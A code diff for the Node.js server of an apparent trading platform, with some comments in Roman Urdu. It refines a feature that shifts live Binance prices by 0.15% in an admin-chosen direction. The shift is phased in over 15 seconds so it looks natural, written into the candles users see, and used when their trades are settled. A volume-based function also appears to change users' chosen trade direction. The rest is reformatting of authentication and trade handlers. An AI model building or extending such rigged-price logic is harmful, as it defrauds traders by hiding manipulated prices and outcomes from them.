@@ -104,6 +104,10 @@ function runTradeMonitorWithWebsockets(io, User, Trade, TRADE_PAIRS) {
     const lastProcessedActivationTs = {};
     let lastCopyTradeCleanup = Date.now();
 
+    // Variables for Smooth Gradual Movement
+    const currentOffsets = {}; 
+    const lastAggTimes = {};
+
     let indexModule = {};
     try {
         indexModule = require('./index');
@@ -132,31 +136,37 @@ function runTradeMonitorWithWebsockets(io, User, Trade, TRADE_PAIRS) {
                 overrides = indexModule.candleOverride || {};
             } catch (e) {}
 
-            const MANIPULATION_PERCENTAGE = 0.0015; // 0.15% final manipulation target
+            const MANIPULATION_PERCENTAGE = 0.0015; // 0.15% manipulation
+            const SMOOTHING_TIME_MS = 15000; // Takes 15 seconds to fully apply offset
 
             // ==========================================
             // 1. ULTRA-FAST TICK-BY-TICK PRICE (aggTrade)
             // ==========================================
             if (parsed.e === 'aggTrade') {
                 const pair = parsed.s;
-                let currentPrice = parseFloat(parsed.p);
-                const binanceTime = parsed.E; // Binance precise time in ms
+                let realPrice = parseFloat(parsed.p);
+                const binanceTime = parsed.E; 
 
-                // 🚀 FIX: Smooth Gradual Manipulation Calculation
-                // Hum pata lagayenge ke is 60 seconds (1 minute) ki candle mein kitna time guzar gaya hai
-                const currentMinuteStart = new Date(binanceTime);
-                currentMinuteStart.setSeconds(0, 0);
-                const elapsedMs = binanceTime - currentMinuteStart.getTime(); // 0 se le kar 59999 tak
-                
-                // Progress 0.0 se shuru ho kar ahista ahista 1.0 tak jayegi candle ke end mein
-                const progress = Math.min(elapsedMs / 60000, 1); 
+                // Target logic
+                let targetOffset = 0;
+                if (overrides[pair] === 'up') targetOffset = realPrice * MANIPULATION_PERCENTAGE;
+                else if (overrides[pair] === 'down') targetOffset = -(realPrice * MANIPULATION_PERCENTAGE);
 
-                // Is progress ko multiply karenge taake shuru mein candle normal lagay aur ahista ahista oopar/neechay move ho
-                if (overrides[pair] === 'up') {
-                    currentPrice += (currentPrice * MANIPULATION_PERCENTAGE * progress); 
-                } else if (overrides[pair] === 'down') {
-                    currentPrice -= (currentPrice * MANIPULATION_PERCENTAGE * progress); 
+                if (currentOffsets[pair] === undefined) currentOffsets[pair] = 0;
+
+                const timeDiff = binanceTime - (lastAggTimes[pair] || binanceTime);
+                lastAggTimes[pair] = binanceTime;
+
+                // Smooth gradual manipulation logic
+                const speedPerMs = (realPrice * MANIPULATION_PERCENTAGE) / SMOOTHING_TIME_MS;
+
+                if (currentOffsets[pair] < targetOffset) {
+                    currentOffsets[pair] = Math.min(currentOffsets[pair] + (speedPerMs * timeDiff), targetOffset);
+                } else if (currentOffsets[pair] > targetOffset) {
+                    currentOffsets[pair] = Math.max(currentOffsets[pair] - (speedPerMs * timeDiff), targetOffset);
                 }
+
+                let currentPrice = realPrice + currentOffsets[pair];
 
                 if (!globalMarketData[pair]) {
                     globalMarketData[pair] = { candles: [], currentCandle: null, lastEmit: 0 };
@@ -178,24 +188,22 @@ function runTradeMonitorWithWebsockets(io, User, Trade, TRADE_PAIRS) {
                 const pair = parsed.s; 
                 const k = parsed.k;
                 
-                let openPrice = parseFloat(k.o);
-                let closePrice = parseFloat(k.c);
-                let highPrice = parseFloat(k.h);
-                let lowPrice = parseFloat(k.l);
+                const activeOffset = currentOffsets[pair] || 0;
 
-                // Gap removal - start new candle exactly where previous ended
+                let openPrice = parseFloat(k.o);
+                let closePrice = parseFloat(k.c) + activeOffset;
+                let highPrice = parseFloat(k.h) + activeOffset;
+                let lowPrice = parseFloat(k.l) + activeOffset;
+
+                // Gap removal logic - Attach new candle to previous close
                 if (globalMarketData[pair] && globalMarketData[pair].candles && globalMarketData[pair].candles.length > 0) {
                     const prevCandle = globalMarketData[pair].candles[globalMarketData[pair].candles.length - 1];
                     openPrice = prevCandle.close; 
+                } else {
+                    openPrice += activeOffset;
                 }
 
-                // Close price par full 100% manipulation apply hogi kyunke candle end ho chuki hai
-                if (overrides[pair] === 'up') {
-                    closePrice += (closePrice * MANIPULATION_PERCENTAGE);
-                } else if (overrides[pair] === 'down') {
-                    closePrice -= (closePrice * MANIPULATION_PERCENTAGE);
-                }
-
+                // Wicks adjustment to avoid visual breaks
                 highPrice = Math.max(highPrice, openPrice, closePrice);
                 lowPrice = Math.min(lowPrice, openPrice, closePrice);
 
@@ -231,6 +239,13 @@ function runTradeMonitorWithWebsockets(io, User, Trade, TRADE_PAIRS) {
                         await settleActiveTradesForPair(io, User, Trade, pair, candleObj);
                         lastProcessedCompletedCandleTs[pair] = lastCompletedTs;
                     }
+
+                    // 🚀 AUTO-RESET LOGIC
+                    try {
+                        if (indexModule.candleOverride && indexModule.candleOverride[pair]) {
+                            indexModule.candleOverride[pair] = null;
+                        }
+                    } catch(e) {}
                 }
 
                 const now = Date.now();
@@ -261,16 +276,22 @@ async function initialize(io, User, Trade, marketData, TRADE_PAIRS) {
     io.use((socket, next) => {
         try {
             let token = socket.handshake.auth?.token;
+            
             if (!token) {
                 const authHeader = socket.handshake.headers.authorization;
                 if (authHeader && authHeader.startsWith('Bearer ')) {
                     token = authHeader.substring(7);
                 }
             }
-            if (!token) return next(new Error("Authentication error: No token"));
+            
+            if (!token) {
+                return next(new Error("Authentication error: No token"));
+            }
             
             jwt.verify(token, process.env.JWT_SECRET, (err, decoded) => {
-                if (err) return next(new Error("Authentication error: Invalid token"));
+                if (err) {
+                    return next(new Error("Authentication error: Invalid token"));
+                }
                 socket.decoded = decoded;
                 next();
             });
@@ -279,6 +300,7 @@ async function initialize(io, User, Trade, marketData, TRADE_PAIRS) {
         }
     });
 
+    // START THE NEW WEBSOCKET MONITORING ENGINE
     runTradeMonitorWithWebsockets(io, User, Trade, TRADE_PAIRS);
 
     io.on("connection", async (socket) => {
@@ -296,6 +318,7 @@ async function initialize(io, User, Trade, marketData, TRADE_PAIRS) {
                 marketData: globalMarketData
             });
 
+            // --- Instant Trade ---
             socket.on("trade", async (data) => {
                 try {
                     const { asset, direction, amount } = data;
@@ -307,13 +330,24 @@ async function initialize(io, User, Trade, marketData, TRADE_PAIRS) {
                         status: { $in: ["pending", "active", "scheduled"] } 
                     });
 
-                    if (existingTrade) return socket.emit("error", { message: `You already have an active trade. Please wait for it to complete.` });
+                    if (existingTrade) {
+                        return socket.emit("error", { 
+                            message: `You already have an active trade. Please wait for it to complete.` 
+                        });
+                    }
 
                     const tradeAmount = parseFloat(amount);
-                    if (isNaN(tradeAmount) || tradeAmount <= 0) return socket.emit("error", { message: "Invalid trade amount." });
+                    if (isNaN(tradeAmount) || tradeAmount <= 0) {
+                        return socket.emit("error", { message: "Invalid trade amount." });
+                    }
 
                     const freshUser = await User.findById(user._id);
-                    if (freshUser.balance < tradeAmount) return socket.emit("error", { message: `Insufficient balance. Required: $${tradeAmount.toFixed(2)}, Available: $${freshUser.balance.toFixed(2)}` });
+
+                    if (freshUser.balance < tradeAmount) {
+                        return socket.emit("error", { 
+                            message: `Insufficient balance. Required: $${tradeAmount.toFixed(2)}, Available: $${freshUser.balance.toFixed(2)}` 
+                        });
+                    }
 
                     const finalDirection = await getTradeDirectionBasedOnVolume(asset, direction);
 
@@ -336,6 +370,7 @@ async function initialize(io, User, Trade, marketData, TRADE_PAIRS) {
                 }
             });
 
+            // --- Copy Trade ---
             socket.on("copy_trade", async (data) => {
                 const session = await mongoose.startSession();
                 session.startTransaction();
@@ -358,7 +393,9 @@ async function initialize(io, User, Trade, marketData, TRADE_PAIRS) {
                     if (existingTrade) {
                         await session.abortTransaction();
                         session.endSession();
-                        return socket.emit("error", { message: `You already have an active trade. Please wait for it to complete before copying.` });
+                        return socket.emit("error", { 
+                            message: `You already have an active trade. Please wait for it to complete before copying.` 
+                        });
                     }
 
                     const copyTrade = await AdminCopyTrade.findById(copyTradeId).session(session);
@@ -368,7 +405,10 @@ async function initialize(io, User, Trade, marketData, TRADE_PAIRS) {
                         return socket.emit("error", { message: "This copy trade is no longer available" });
                     }
 
-                    const alreadyCopied = copyTrade.userCopies.find(copy => copy.userId.toString() === userId);
+                    const alreadyCopied = copyTrade.userCopies.find(
+                        copy => copy.userId.toString() === userId
+                    );
+
                     if (alreadyCopied) {
                         await session.abortTransaction();
                         session.endSession();
@@ -380,7 +420,9 @@ async function initialize(io, User, Trade, marketData, TRADE_PAIRS) {
                     if (freshUser.balance < tradeAmount) {
                         await session.abortTransaction();
                         session.endSession();
-                        return socket.emit("error", { message: `Insufficient balance. Required: $${tradeAmount.toFixed(2)}, Available: $${freshUser.balance.toFixed(2)}` });
+                        return socket.emit("error", { 
+                            message: `Insufficient balance. Required: $${tradeAmount.toFixed(2)}, Available: $${freshUser.balance.toFixed(2)}` 
+                        });
                     }
 
                     const executionTime = new Date(copyTrade.executionTime);
@@ -476,7 +518,12 @@ async function activateScheduledTradesForPair(io, Trade, pair, candleTimestamp, 
         const candleTime = new Date(candleTimestamp);
         candleTime.setSeconds(0, 0);
 
-        const scheduleds = await Trade.find({ status: "scheduled", asset: pair, scheduledTime: { $lte: candleTime } });
+        const scheduleds = await Trade.find({ 
+            status: "scheduled", 
+            asset: pair, 
+            scheduledTime: { $lte: candleTime } 
+        });
+
         for (const t of scheduleds) {
             t.status = "active";
             t.entryPrice = entryPrice;
@@ -523,17 +570,35 @@ async function settleActiveTradesForPair(io, User, Trade, pair, lastCompletedCan
                 t.closeTime = new Date(); 
                 await t.save();
 
-                const userAfter = await User.findByIdAndUpdate(t.userId, { $inc: { balance: t.amount + pnl, totalTradeVolume: t.amount } }, { new: true });
+                const userAfter = await User.findByIdAndUpdate(
+                    t.userId,
+                    {
+                        $inc: {
+                            balance: t.amount + pnl, 
+                            totalTradeVolume: t.amount
+                        }
+                    },
+                    { new: true }
+                );
 
                 const today = new Date();
                 today.setHours(0, 0, 0, 0);
                 const tomorrow = new Date(today);
                 tomorrow.setDate(tomorrow.getDate() + 1);
 
-                const todayTrades = await Trade.find({ userId: t.userId, status: "closed", closeTime: { $gte: today, $lt: tomorrow } });
+                const todayTrades = await Trade.find({
+                    userId: t.userId,
+                    status: "closed",
+                    closeTime: { $gte: today, $lt: tomorrow }
+                });
+
                 const todayPnl = todayTrades.reduce((sum, trade) => sum + (trade.pnl || 0), 0);
 
-                io.to(t.userId.toString()).emit("trade_result", { trade: t, balance: userAfter.balance, todayPnl: parseFloat(todayPnl.toFixed(2)) });
+                io.to(t.userId.toString()).emit("trade_result", { 
+                    trade: t, 
+                    balance: userAfter.balance,
+                    todayPnl: parseFloat(todayPnl.toFixed(2))
+                });
             }
         }
     } catch (err) {}
